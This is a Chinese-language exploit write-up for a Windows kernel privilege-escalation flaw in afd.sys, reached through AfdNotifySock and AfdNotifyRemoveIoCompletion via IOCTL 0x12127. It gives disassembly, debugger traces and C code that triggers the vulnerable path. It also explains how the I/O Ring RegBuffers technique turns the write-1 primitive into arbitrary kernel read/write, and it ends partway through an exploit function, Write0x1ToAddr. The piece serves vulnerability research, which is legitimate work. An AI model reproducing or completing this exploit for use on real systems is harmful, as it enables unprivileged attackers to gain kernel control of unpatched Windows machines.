## 1.漏洞分析

windows提权漏洞,漏洞位在afd.sys AfdNotifyRemoveIoCompletion函数中.

afd.sys是windows操作系统的一个驱动程序,是winsock的一部分,用于提供网络通信的支持.

使用ida加载符号,直接定位到这个漏洞函数AfdNotifyRemoveIoCompletion中.x一下,看下这个函数的调用链.这个函数在AfdNotifySock中经过一系列验证后被调用.

    
    
    PAGE:00000001C006FEAE                               loc_1C006FEAE:                          ; CODE XREF: AfdNotifySock+23B↑j
    PAGE:00000001C006FEAE 48 8D 0C 5B                   lea     rcx, [rbx+rbx*2]
    PAGE:00000001C006FEB2 48 8B 46 08                   mov     rax, [rsi+8]
    PAGE:00000001C006FEB6 44 89 44 C8 14                mov     [rax+rcx*8+14h], r8d
    PAGE:00000001C006FEBB 48 8B 15 AE F9 FE FF          mov     rdx, cs:MmUserProbeAddress
    PAGE:00000001C006FEBB
    PAGE:00000001C006FEC2
    PAGE:00000001C006FEC2                               loc_1C006FEC2:                          ; CODE XREF: AfdNotifySock+273↑j
    PAGE:00000001C006FEC2 41 FF C7                      inc     r15d
    PAGE:00000001C006FEC5 E9 AA FE FF FF                jmp     loc_1C006FD74
    PAGE:00000001C006FEC5
    PAGE:00000001C006FECA                               ; ---------------------------------------------------------------------------    PAGE:00000001C006FECA
    PAGE:00000001C006FECA                               loc_1C006FECA:                          ; CODE XREF: AfdNotifySock+148↑j
    PAGE:00000001C006FECA 4C 8B C6                      mov     r8, rsi
    PAGE:00000001C006FECD 49 8B D6                      mov     rdx, r14
    PAGE:00000001C006FED0 41 8A CC                      mov     cl, r12b
    PAGE:00000001C006FED3 E8 54 FA FF FF                call    AfdNotifyRemoveIoCompletion
    PAGE:00000001C006FED3
    PAGE:00000001C006FED8 8B D8                         mov     ebx, eax
    

AfdNotifySock位于AfdImmediateCallDispatch表中的最后.  
![image](https://image.3001.net/images/20230730/1690724607_64c668ffa6d1d6025d8b0.png!small)

在AfdFastIoDeviceControl中,通过control
code,调用AfdImmediateCallDispatch中的函数,这里最后一个索引处的值是0x12127.也就是说当iocode为0x12127时,会调用到函数AfdNotifySock.

调用链如下

(DriverObject->FastIoDispatch)->AfdFastIoDeviceControl
0x12127->AfdNotifySock->AfdNotifyRemoveIoCompletion

![image](https://image.3001.net/images/20230730/1690724628_64c66914462331bc0b726.png!small)  
![image](https://image.3001.net/images/20230730/1690724635_64c6691b532e5246c7811.png!small)

下面编写一个测试代码.调用AfdNotifySock函数

    
    
    #include <iostream>
    #include <windows.h>
    #include <winternl.h>
    #include <ioringapi.h>
    
    
    typedef DWORD(WINAPI* FUN_NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
    typedef DWORD(WINAPI* FUN_NtDeviceIoControlFile)(HANDLE FileHandle, HANDLE Event, VOID* ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
    typedef DWORD(WINAPI* FUN_NtCreateIoCompletion)(PHANDLE IoCompletionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG NumberOfConcurrentThreads);
    typedef DWORD(WINAPI* FUN_NtSetIoCompletion)(HANDLE IoCompletionHandle, ULONG CompletionKey, PIO_STATUS_BLOCK IoStatusBlock, NTSTATUS CompletionStatus, ULONG NumberOfBytesTransferred);
    typedef DWORD(WINAPI* FUN_NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    
    #define AFL_NOTIFYSOCK_IOCTL 0x12127
    
    int main(int argc, char* argv[])
    {
    	HMODULE ntBase = GetModuleHandleW(L"ntdll.dll");
    	FUN_NtCreateFile NtCreateFile = (FUN_NtCreateFile)GetProcAddress(ntBase, "NtCreateFile");
    	FUN_NtDeviceIoControlFile  NtDeviceIoControlFile = (FUN_NtDeviceIoControlFile)GetProcAddress(ntBase, "NtDeviceIoControlFile");
    	UNICODE_STRING objFilePath = { 0 };
    	OBJECT_ATTRIBUTES objectAttributes = { 0 };
    	IO_STATUS_BLOCK ioStatusBlock = { 0 };
    	HANDLE hSocket = NULL;
    
    	objFilePath.Buffer = (PWSTR)L"\\Device\\Afd\\Endpoin";
    	objFilePath.Length = wcslen(objFilePath.Buffer) * sizeof(WCHAR);
    	objFilePath.MaximumLength = objFilePath.Length;
    
    	objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    	objectAttributes.ObjectName = &ampobjFilePath
    	objectAttributes.Attributes = 0x40;
    
    	BYTE bExtendedAttributes[] =
    	{
    		0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
    		0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    		0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    		0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
    	};
    
    	NTSTATUS status = NtCreateFile(&hSocket, MAXIMUM_ALLOWED, &objectAttributes, &ioStatusBlock, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 1, 0, bExtendedAttributes, sizeof(bExtendedAttributes));
    	if (!NT_SUCCESS(status)) {
    		printf("[-]NtCreateFile fail:%x\n", status);
    		return 0;
    	}
    	HANDLE hEvent = CreateEvent(0, 0, 0, 0);
    	if (hEvent == NULL) {
    		printf("[-]CreateEvent fail:%x\n", GetLastError());
    		return 0;
    	}
    	int dataLen = 0x10;
    	char* data = (char*)malloc(dataLen);
    	memset(data, 0x41, dataLen);
    	NtDeviceIoControlFile(hSocket, hEvent, NULL, NULL, &ioStatusBlock, 0x12127, data, dataLen, NULL, 0);
    }
    

开始使用windbg调试,成功加载符号

    
    
    4: kd> lm m a*
    Browse full module list
    start             end                 module name
    fffff800`62b80000 fffff800`62ba7000   acpiex     (deferred)
    fffff800`62c30000 fffff800`62ce8000   ACPI       (deferred)
    fffff800`631e0000 fffff800`631ed000   atapi      (deferred)
    fffff800`631f0000 fffff800`6322d000   ataport    (deferred)
    fffff800`67200000 fffff800`672a8000   afd        (pdb symbols)          e:\symbols\afd.pdb\8B67DF69C5D3BE18663EDAF70A48AEB51\afd.pdb
    fffff800`67340000 fffff800`67354000   afunix     (deferred)
    fffff800`67600000 fffff800`6765b000   ahcache    (deferred)
    

使用windbg对下断点

    
    
    bp afd!AfdNotifySock
    

运行到此处,就跳转到后面然后返回了,没有调用到漏洞函数AfdNotifyRemoveIoCompletion,这里是因为数据长度不为0x30.所以直接跳转返回0x0C0000004了,AfdNotifySock有些前置条件判断,才会执行AfdNotifyRemoveIoCompletion.

    
    
    fffff800`6726fc30 488bc4           mov     rax, rsp
    fffff800`6726fc33 48895810         mov     qword ptr [rax+10h], rbx
    fffff800`6726fc37 48897018         mov     qword ptr [rax+18h], rsi
    fffff800`6726fc3b 48894808         mov     qword ptr [rax+8], rcx
    fffff800`6726fc3f 57               push    rdi
    fffff800`6726fc40 4154             push    r12
    fffff800`6726fc42 4155             push    r13
    fffff800`6726fc44 4156             push    r14
    fffff800`6726fc46 4157             push    r15
    fffff800`6726fc48 4881eca0000000   sub     rsp, 0A0h
    fffff800`6726fc4f 498bf1           mov     rsi, r9
    fffff800`6726fc52 458ae0           mov     r12b, r8b
    fffff800`6726fc55 0f57c0           xorps   xmm0, xmm0
    fffff800`6726fc58 0f114098         movups  xmmword ptr [rax-68h], xmm0
    fffff800`6726fc5c 0f1140a8         movups  xmmword ptr [rax-58h], xmm0
    fffff800`6726fc60 0f1140b8         movups  xmmword ptr [rax-48h], xmm0
    fffff800`6726fc64 33ff             xor     edi, edi
    fffff800`6726fc66 448bf7           mov     r14d, edi
    fffff800`6726fc69 33c0             xor     eax, eax
    fffff800`6726fc6b 0f11442438       movups  xmmword ptr [rsp+38h], xmm0
    fffff800`6726fc70 4889442448       mov     qword ptr [rsp+48h], rax
    fffff800`6726fc75 83bc24f000000030 cmp     dword ptr [rsp+0F0h], 30h
    fffff800`6726fc7d 740a             je      afd!AfdNotifySock+0x59 (fffff8006726fc89)
    fffff800`6726fc7f bb040000c0       mov     ebx, 0C0000004h
    fffff800`6726fc84 e951020000       jmp     afd!AfdNotifySock+0x2aa (fffff8006726feda)
    

第4个参数是数据,第5个参数是数据长度.第6个参数是outbuf,第7个是outbuglen,当前传入数据为长度为0x41,长度为0x10.

    
    
    __int64 __fastcall AfdNotifySock(
            __int64 a1,
            __int64 a2,
            KPROCESSOR_MODE a3,
            __int128 *userdata,
            int userdatalen,
            __int64 outbuf,
            int outbuglen)
    {
    
    
    
    2: kd> dd r9
    000001ce`8db6d320  41414141 41414141 41414141 41414141
    000001ce`8db6d330  0057005c 006e0069 4c459150 80000677
    000001ce`8db6d340  00000000 00000000 5c01005d 0e00462d
    000001ce`8db6d350  3d3a3a3d 005c3a3a 4c479156 80000753
    000001ce`8db6d360  464f5250 3d454c49 505c3a43 72676f72
    000001ce`8db6d370  61446d61 41006174 4c419154 80000854
    000001ce`8db6d380  73555c3a 5c737265 6c687361 7070415c
    000001ce`8db6d390  61746144 616f525c 4c43915a 80000900
    2: kd> dd rsp+20+a0+10+18+8
    fffff587`bf33a470  00000010 ffffb209 00000000 00000000
    

首先会对数据长度与合法性做一些验证,

首先userbuf数据长度应为0x30.

然后判断userbuf偏移为0x10,0x18,0x20,0x24,0x28处数据是否为空.

    
    
    PAGE:00000001C006FC75 83 BC 24 F0 00 00 00 30       cmp     [rsp+0C8h+userdatalen], 30h ; '0'
    PAGE:00000001C006FC7D 74 0A                         jz      short loc_1C006FC89
    PAGE:00000001C006FC7D
    PAGE:00000001C006FC7F
    PAGE:00000001C006FC7F                               loc_1C006FC7F:                          ; CODE XREF: AfdNotifySock+60↓j
    PAGE:00000001C006FC7F BB 04 00 00 C0                mov     ebx, 0C0000004h
    PAGE:00000001C006FC84 E9 51 02 00 00                jmp     loc_1C006FEDA
    PAGE:00000001C006FC84
    PAGE:00000001C006FC89                               ; ---------------------------------------------------------------------------    PAGE:00000001C006FC89
    PAGE:00000001C006FC89                               loc_1C006FC89:                          ; CODE XREF: AfdNotifySock+4D↑j
    PAGE:00000001C006FC89 39 BC 24 00 01 00 00          cmp     [rsp+0C8h+outdatalen], edi
    PAGE:00000001C006FC90 75 ED                         jnz     short loc_1C006FC7F
    PAGE:00000001C006FC90
    PAGE:00000001C006FC92 48 39 BC 24 F8 00 00 00       cmp     [rsp+0C8h+outdata], rdi
    PAGE:00000001C006FC9A 74 0A                         jz      short loc_1C006FCA6
    PAGE:00000001C006FC9A
    PAGE:00000001C006FC9C
    PAGE:00000001C006FC9C                               loc_1C006FC9C:                          ; CODE XREF: AfdNotifySock+C0↓j
    PAGE:00000001C006FC9C                                                                       ; AfdNotifySock+CB↓j
    PAGE:00000001C006FC9C                                                                       ; AfdNotifySock+D2↓j
    PAGE:00000001C006FC9C                                                                       ; AfdNotifySock+D8↓j
    PAGE:00000001C006FC9C                                                                       ; AfdNotifySock+DE↓j
    PAGE:00000001C006FC9C BB 0D 00 00 C0                mov     ebx, 0C000000Dh
    PAGE:00000001C006FCA1 E9 34 02 00 00                jmp     loc_1C006FEDA
    PAGE:00000001C006FCA1
    PAGE:00000001C006FCA6                               ; ---------------------------------------------------------------------------    PAGE:00000001C006FCA6
    PAGE:00000001C006FCA6                               loc_1C006FCA6:                          ; CODE XREF: AfdNotifySock+6A↑j
    PAGE:00000001C006FCA6 45 84 E4                      test    r12b, r12b
    PAGE:00000001C006FCA9 74 42                         jz      short loc_1C006FCED
    PAGE:00000001C006FCA9
    PAGE:00000001C006FCAB
    PAGE:00000001C006FCAB                               loc_1C006FCAB:                          ; DATA XREF: .rdata:00000001C00569F8↑o
    PAGE:00000001C006FCAB                               ;   __try { // __except at loc_1C006FCE1
    PAGE:00000001C006FCAB 48 8B 05 BE FB FE FF          mov     rax, cs:MmUserProbeAddress
    PAGE:00000001C006FCB2 48 8B 08                      mov     rcx, [rax]
    PAGE:00000001C006FCB5 48 3B F1                      cmp     rsi, rcx
    PAGE:00000001C006FCB8 48 0F 43 F1                   cmovnb  rsi, rcx
    PAGE:00000001C006FCBC 0F 10 06                      movups  xmm0, xmmword ptr [rsi]
    PAGE:00000001C006FCBF 0F 11 44 24 60                movups  [rsp+0C8h+var_68], xmm0
    PAGE:00000001C006FCC4 0F 10 4E 10                   movups  xmm1, xmmword ptr [rsi+10h]
    PAGE:00000001C006FCC8 0F 11 4C 24 70                movups  [rsp+0C8h+var_58], xmm1
    PAGE:00000001C006FCCD 0F 10 46 20                   movups  xmm0, xmmword ptr [rsi+20h]
    PAGE:00000001C006FCD1 0F 11 84 24 80 00 00 00       movups  [rsp+0C8h+var_48], xmm0
    PAGE:00000001C006FCD9 90                            nop
    PAGE:00000001C006FCD9                               ;   } // starts at 1C006FCAB
    PAGE:00000001C006FCD9
    PAGE:00000001C006FCDA
    PAGE:00000001C006FCDA                               loc_1C006FCDA:                          ; DATA XREF: .rdata:00000001C00569F8↑o
    PAGE:00000001C006FCDA 48 8D 74 24 60                lea     rsi, [rsp+0C8h+var_68]
    PAGE:00000001C006FCDF EB 0C                         jmp     short loc_1C006FCED
    PAGE:00000001C006FCDF
    PAGE:00000001C006FCE1                               ; ---------------------------------------------------------------------------    PAGE:00000001C006FCE1
    PAGE:00000001C006FCE1                               loc_1C006FCE1:                          ; DATA XREF: .rdata:00000001C00501D4↑o
    PAGE:00000001C006FCE1                                                                       ; .rdata:00000001C00569F8↑o
    PAGE:00000001C006FCE1                               ;   __except(1) // owned by 1C006FCAB
    PAGE:00000001C006FCE1 8B D8                         mov     ebx, eax
    PAGE:00000001C006FCE3 33 FF                         xor     edi, edi
    PAGE:00000001C006FCE5 44 8B F7                      mov     r14d, edi
    PAGE:00000001C006FCE8 E9 ED 01 00 00                jmp     loc_1C006FEDA
    PAGE:00000001C006FCE8
    PAGE:00000001C006FCED                               ; ---------------------------------------------------------------------------    PAGE:00000001C006FCED
    PAGE:00000001C006FCED                               loc_1C006FCED:                          ; CODE XREF: AfdNotifySock+79↑j
    PAGE:00000001C006FCED                                                                       ; AfdNotifySock+AF↑j
    PAGE:00000001C006FCED 39 7E 20                      cmp     [rsi+20h], edi
    PAGE:00000001C006FCF0 74 AA                         jz      short loc_1C006FC9C
    PAGE:00000001C006FCF0
    PAGE:00000001C006FCF2 39 7E 28                      cmp     [rsi+28h], edi
    PAGE:00000001C006FCF5 75 0D                         jnz     short loc_1C006FD04
    PAGE:00000001C006FCF5
    PAGE:00000001C006FCF7 48 39 7E 10                   cmp     [rsi+10h], rdi
    PAGE:00000001C006FCFB 75 9F                         jnz     short loc_1C006FC9C
    PAGE:00000001C006FCFB
    PAGE:00000001C006FCFD 39 7E 24                      cmp     [rsi+24h], edi
    PAGE:00000001C006FD00 74 0E                         jz      short loc_1C006FD10
    PAGE:00000001C006FD00
    PAGE:00000001C006FD02 EB 98                         jmp     short loc_1C006FC9C
    PAGE:00000001C006FD02
    PAGE:00000001C006FD04                               ; ---------------------------------------------------------------------------    PAGE:00000001C006FD04
    PAGE:00000001C006FD04                               loc_1C006FD04:                          ; CODE XREF: AfdNotifySock+C5↑j
    PAGE:00000001C006FD04 48 39 7E 18                   cmp     [rsi+18h], rdi
    PAGE:00000001C006FD08 74 92                         jz      short loc_1C006FC9C
    PAGE:00000001C006FD08
    PAGE:00000001C006FD0A 48 39 7E 10                   cmp     [rsi+10h], rdi
    PAGE:00000001C006FD0E 74 8C                         jz      short loc_1C006FC9C
    

而后传入userdata前8个字节数据,传入ObReferenceObjectByHandle,通过句柄获取了一个IoCompletionObjectType类型的内核对象.所以这里ring3传入数据开头处应是一个IoCompletionObjectType类型的句柄.这里执行失败会直接返回.

    
    
    PAGE:00000001C006FD10                               loc_1C006FD10:                          ; CODE XREF: AfdNotifySock+D0↑j
    PAGE:00000001C006FD10 48 8B 05 71 F8 FE FF          mov     rax, cs:__imp_IoCompletionObjectType
    PAGE:00000001C006FD17 4C 8B 00                      mov     r8, [rax]                       ; ObjectType
    PAGE:00000001C006FD1A 48 8B 0E                      mov     rcx, [rsi]                      ; Handle
    PAGE:00000001C006FD1D 48 89 7C 24 50                mov     [rsp+0C8h+var_78], rdi
    PAGE:00000001C006FD22 48 89 7C 24 28                mov     [rsp+0C8h+HandleInformation], rdi ; HandleInformation
    PAGE:00000001C006FD27 48 8D 44 24 50                lea     rax, [rsp+0C8h+var_78]
    PAGE:00000001C006FD2C 48 89 44 24 20                mov     [rsp+0C8h+Object], rax          ; Object
    PAGE:00000001C006FD31 45 8A CC                      mov     r9b, r12b                       ; AccessMode
    PAGE:00000001C006FD34 BA 02 00 00 00                mov     edx, 2                          ; DesiredAccess
    PAGE:00000001C006FD39 48 FF 15 A8 FB FE FF          call    cs:__imp_ObReferenceObjectByHandle
    PAGE:00000001C006FD39
    PAGE:00000001C006FD40 0F 1F 44 00 00                nop     dword ptr [rax+rax+00h]
    PAGE:00000001C006FD45 8B D8                         mov     ebx, eax
    PAGE:00000001C006FD47 4C 8B 74 24 50                mov     r14, [rsp+0C8h+var_78]
    PAGE:00000001C006FD4C 4C 89 74 24 30                mov     [rsp+0C8h+var_98], r14
    PAGE:00000001C006FD51 85 C0                         test    eax, eax
    PAGE:00000001C006FD53 0F 88 81 01 00 00             js      loc_1C006FEDA
    

通过上面对userbuf的数据验证,可以推测出这样的一个数据结构

    
    
    typedef struct userbuf {
    	HANDLE completionHandle;
    	PVOID pData1;
    	PVOID pData2;
    	PVOID pData3;
    	DWORD dw1;
    	DWORD dw2;
    	DWORD dw3;
    	DWORD nop;
    }userbuf;
    

目前需要在ring3构造出一个completionHandle句柄,让ObReferenceObjectByHandle成功执行.

IoCompletionObjectType是io完成对象,一般来说是内核创建进行管理的.ring3一般不会用到,不过是可以通过一些函数在ring3创建出这个类型的句柄的.

可以通过函数NtCreateIoCompletion创建IoCompletion对象句柄.

接着后面的代码是从userbuf->pData1中循环取数据,循环次数是userdata->dw1.这里设置成1就好,不要过大,内存不够就异常了.

最后执行到目标漏洞函数:AfdNotifyRemoveIoCompletion,传入3个参数,分别是先前模式,IoCompletion对象,userdata.

    
    
    if ( ntstatus >= 0 )
      {
        mode32_flag = IoIs32bitProcess(0i64);
        index = 0;
        userprobeAddress = MmUserProbeAddress;
        while ( index < userdata_->dw1 )
        {
          if ( pre_mode )
          {
            v25 = 0i64;
            v26 = 0i64;
            index_1 = index;
            data1 = userdata_->data1;
            if ( mode32_flag )
            {
              index_data = &data1[0x10 * index];
              v30 = index_data;
              if ( (index_data & 3) != 0 )
                ExRaiseDatatypeMisalignment();
              if ( index_data + 0x10 > *userprobeAddress || index_data + 0x10 < index_data )
                **userprobeAddress = 0;
              *&v25 = *index_data;
              *(&v25 + 1) = *(index_data + 4);
              LOWORD(v26) = *(index_data + 8);
              BYTE2(v26) = *(index_data + 0xA);
            }
            else
            {
              v18 = &data1[0x18 * index];
              if ( v18 >= *userprobeAddress )
                v18 = *userprobeAddress;
              v25 = *v18;
              v26 = *(v18 + 2);
            }
            v19 = &ampv25
            v28 = &ampv25
          }
          else
          {
            index_1 = index;
            v19 = (userdata_->data1 + 0x18 * index);
            v28 = v19;
          }
          v20 = a1;
          if ( index )
            v20 = 0i64;
          v21 = AfdNotifyProcessRegistration(pre_mode, iocompletObj, v19, v20);
          if ( pre_mode )
          {
            user_data1 = userdata_->data1;
            userprobeAddress = MmUserProbeAddress;
            if ( mode32_flag )
              v23 = &user_data1[0x10 * index_1 + 0xC];
            else
              v23 = &user_data1[0x18 * index_1 + 0x14];
            if ( v23 >= MmUserProbeAddress )
              v23 = MmUserProbeAddress;
            *v23 = v21;
          }
          else
          {
            *(userdata_->data1 + 6 * index_1 + 5) = v21;
            userprobeAddress = MmUserProbeAddress;
          }
          ++index;
        }
        ntstatus = AfdNotifyRemoveIoCompletion(pre_mode, iocompletObj, userdata_);
    

进入AfdNotifyRemoveIoCompletion函数,重点关注以下的代码,首先如果先前模式在ring3,对ring3的用户缓冲区user_data->data2进行验证.在后面调用了IoRemoveIoCompletion.

如果IoRemoveIoCompletion执行成功,后面会将IoRemoveIoCompletion的第5个参数的值赋值给了user_data->data3,这里在赋值之前没有向之前user_data->data2那样进行验证.所以AfdNotifyRemoveIoCompletion函数的漏洞点就位于这个地方.或许可以完成任意地址读写.

要让IoRemoveIoCompletion返回0,可以在ring3执行NtSetIoCompletion,向队列添加完成包,此处就会执行成功.

    
    
    __int64 __fastcall AfdNotifyRemoveIoCompletion(
            KPROCESSOR_MODE pre_mode,
            __int64 iocomplet_obj,
            struct_userdata_ *user_data)
    {
    .................................................
        if ( pre_mode )
          ProbeForWrite(user_data->data2, v9, v11);
        if ( process_32_flag )
        {
          if ( user_data_dw3 <= 0x10 )
          {
            keyContext = v27;
          }
          else
          {
            keyContext = ExAllocatePool2(0x102i64, v7, 0x4E646641i64);
            v21 = keyContext;
            if ( keyContext )
              goto LABEL_20;
            keyContext = v27;
            LODWORD(user_data_dw3) = 0x10;
          }
        }
        else
        {
          keyContext = user_data->data2;
        }
        v21 = keyContext;
    LABEL_20:
        dw2 = user_data->dw2;
        if ( dw2 == 0xFFFFFFFF )
        {
          v13 = 0i64;
        }
        else
        {
          v24 = 0xFFFFFFFFFFFFD8F0ui64 * dw2;
          v13 = &ampv24
        }
        if ( user_data_dw3 > 0x10 )
        {
          apcContext = ExAllocatePool2(0x42i64, 8i64 * user_data_dw3, 0x4E646641i64);
          pool_ = apcContext;
          if ( apcContext )
            goto LABEL_27;
          LODWORD(user_data_dw3) = 0x10;
        }
        apcContext = len_128_mem;
        pool_ = len_128_mem;
    LABEL_27:
        nstatus = IoRemoveIoCompletion(iocomplet_obj_, keyContext, apcContext, user_data_dw3, &v20, pre_mode, v13, 0);
        if ( !nstatus )
        {
          if ( v19 )
          {
            for ( i = 0; i < v20; ++i )
            {
              v15 = &keyContext[0x20 * i];
              v16 = user_data->data2 + 0x10 * i;
              *v16 = *v15;
              v16[1] = *(v15 + 2);
              v16[3] = *(v15 + 6);
              v16[2] = *(v15 + 4);
            }
          }
          *user_data->data3 = v20;
          goto LABEL_33;
        }
      }
    

IoRemoveIoCompletion的参数,网上查了些资料,参数的数量都不太明确,所以要到ntoskrnl.exe里面看一下.

    
    
    __int64 __fastcall IoRemoveIoCompletion(
            struct _KQUEUE *a1,
            __int64 a2,
            PLIST_ENTRY *EntryArray,
            ULONG Count,
            ULONG *a5,
            KPROCESSOR_MODE a6,
            LARGE_INTEGER *Timeout,
            BOOLEAN a8)
    {
    

第5个参数是KeRemoveQueueEx的返回值.这个函数返回值应该是1.最终调用到了KiAttemptFastRemoveQueue,功能应该是从线程队列中移除等待条目.或者是从队列对象中等待.返回值应该是移除的条目.但是这个值是不好控制的.

![image](https://image.3001.net/images/20230730/1690724683_64c6694b1457c88b8c9bc.png!small)

这几篇文章介绍了io ring和通过io ring实现的读写原语技术:

https://windows-internals.com/i-o-rings-when-one-i-o-operation-is-not-enough/

https://windows-internals.com/one-year-to-i-o-ring-what-changed/

https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/

## 2.i/o Ring 技术与

io ring是windows11新版本的功能,一种新的数据传输方式.通过对多个io的操作构建成队列.

在一个操作中可以执行大量io操作,节省了ring3-ring0,ring0-ring3...之间重复切换的过程.之前的io ring只支持读取.

目前支持了写入和刷新.

io ring对象的创建通过函数NtCreateIoRing创建.创建的内核对象结构如下

    
    
    typedef struct _IORING_OBJECT
    {
        USHORT Type;
        USHORT Size;
        NT_IORING_INFO UserInfo;
        PVOID Section;
        PNT_IORING_SUBMISSION_QUEUE SubmissionQueue;
        PMDL CompletionQueueMdl;
        PNT_IORING_COMPLETION_QUEUE CompletionQueue;
        ULONG64 ViewSize;
        ULONG InSubmit;
        ULONG64 CompletionLock;
        ULONG64 SubmitCount;
        ULONG64 CompletionCount;
        ULONG64 CompletionWaitUntil;
        KEVENT CompletionEvent;
        UCHAR SignalCompletionEvent;
        PKEVENT CompletionUserEvent;
        ULONG RegBuffersCount;
        PVOID RegBuffers;
        ULONG RegFilesCount;
        PVOID* RegFiles;
    } IORING_OBJECT, *PIORING_OBJECT;
    

io ring的结构,前10个字节是header.后面的NT_IORING_SQE结构,每一个代表一个请求的io操作.

header中描述了应该处理哪些条目.head指定最后一个不处理条目的位置索引,tail指定在哪个索引处停止

![image](https://image.3001.net/images/20230730/1690724698_64c6695ae80d89325e733.png!small)

NT_IORING_SQE的结构如下.

OpCode对应的控制码和功能如下,在ring3中通过kernelbase.dll的辅助函数进行调用的

IORING_OP_NOP:无

IORING_OP_READ:将数据从文件读取到输出缓冲区,通过kernelBase!BuildIoRingReadFile调用.

IORING_OP_REGISTER_FILES:请求预注册文件句柄以供稍后处理,通过kernelBase!BuildIoRingRegisterBuffers调用

IORING_OP_REGISTER_BUFFER:请求已注册输出缓冲区读取文件数据,通过kernelBase!BuildIoRingRegisterFileHandles调用

IORING_OP_CANCEL: 请求取消文件的挂起操作,通过kernelbase!BuildIoRingCancelRequest调用

IORING_OP_WRITE:请求将输出缓冲区的数据写入到文件,通过kernelbase!BuildIoRingWriteFile调用

IORING_OP_FLUSH:请求刷新文件,通过kernelbase!BuildIoRingFlushFile调用

    
    
    typedef struct _NT_IORING_SQE
    {
        enum IORING_OP_CODE OpCode;
        enum NT_IORING_SQE_FLAGS Flags;
        union
        {
            ULONG64 UserData;
            ULONG64 PaddingUserDataForWow;
        };
        union
        {
            NT_IORING_OP_READ Read;
            NT_IORING_OP_REGISTER_FILES RegisterFiles;
            NT_IORING_OP_REGISTER_BUFFERS RegisterBuffers;
            NT_IORING_OP_CANCEL Cancel;
            NT_IORING_OP_WRITE Write;
            NT_IORING_OP_FLUSH Flush;
            NT_IORING_OP_RESERVED ReservedMaxSizePadding;
        };
    } NT_IORING_SQE, *PNT_IORING_SQE;
    

下面是一个读取操作

当Flags为3时,FileRef是文件句柄的索引,这是在ring3提前打开的一些文件句柄,在io ring注册之后,以数组的方式存储.

同样的buffer也是索引,缓冲区也可以提前创建好并预注册的,最后按照索引将文件数据读取buffer->length长度,写入到buffer->address预注册缓冲区中.

通过这样的结构,形成了一个读取队列.

![image](https://image.3001.net/images/20230730/1690724710_64c669668809a3be17418.png!small)

一个环形队列结构

![image](https://image.3001.net/images/20230730/1690724719_64c6696fd94a8b4f8e606.png!small)

上面是一个IORING_OP_READ的过程.将文件数据读取到了预注册的缓冲区.

也可以通过IORING_OP_WRITE将预注册缓冲区的数据写入到文件中.

如果存在任意地址的写入漏洞,可以覆盖内核对象中ioring->RegBuffer的指针,让其指向的内存可控,在内核处理时,并不会检测验证,它会认为这是一个预注册的缓冲区.所以可以利用漏洞伪造一个缓冲区数组,控制buffer->address和buff->length,然后调用BuildIoRingReadFile/BuildIoRingWriteFile函数.实现任意地址的读写.

但是针对这个漏洞,由于KeRemoveQueueEx的返回值总是1,所以我们只能对任意内核地址写入1.没有办法直接写入任意数据.

目前io ring的读写都是基于文件的,在文章中,提到了使用管道的方式,更加隐蔽.

## 3.漏洞利用

 **1.首先,要编写代码绕过之前分析的一些条件,让其可以正常执行到漏洞点.**

    
    
    int Write0x1ToAddr(PVOID writeAddr) {
    	UNICODE_STRING objFilePath = { 0 };
    	OBJECT_ATTRIBUTES objectAttributes = { 0 };
    	IO_STATUS_BLOCK ioStatusBlock = { 0 };
    	HANDLE hSocket = NULL;
    	HANDLE hCompletion = NULL;
    	HANDLE hEvent = NULL;
    	AFD_NOTIFYSOCK_INPUT data = { 0 };
    	NTSTATUS status = 0;
    
    	objFilePath.Buffer = (PWSTR)L"\\Device\\Afd\\Endpoin";
    	objFilePath.Length = wcslen(objFilePath.Buffer) * sizeof(WCHAR);
    	objFilePath.MaximumLength = objFilePath.Length;
    	objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    	objectAttributes.ObjectName = &ampobjFilePath
    	objectAttributes.Attributes = 0x40;
    
    	BYTE bExtendedAttributes[] =
    	{
    		0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
    		0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    		0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    		0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
    	};
    
    	status = _NtCreateFile(&hSocket, MAXIMUM_ALLOWED, &objectAttributes, &ioStatusBlock, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 1, 0, bExtendedAttributes, sizeof(bExtendedAttributes));
    	if (!NT_SUCCESS(status)) {
    		printf("[-]NtCreateFile fail:%x\n", status);
    		return 0;
    	}
    
    
    	status = _NtCreateIoCompletion(&hCompletion, MAXIMUM_ALLOWED, NULL, 1);
    	if (!NT_SUCCESS(status)) {
    		printf("[-]NtCreateIoCompletion fail:%x\n", status);
    		return 0;
    	}
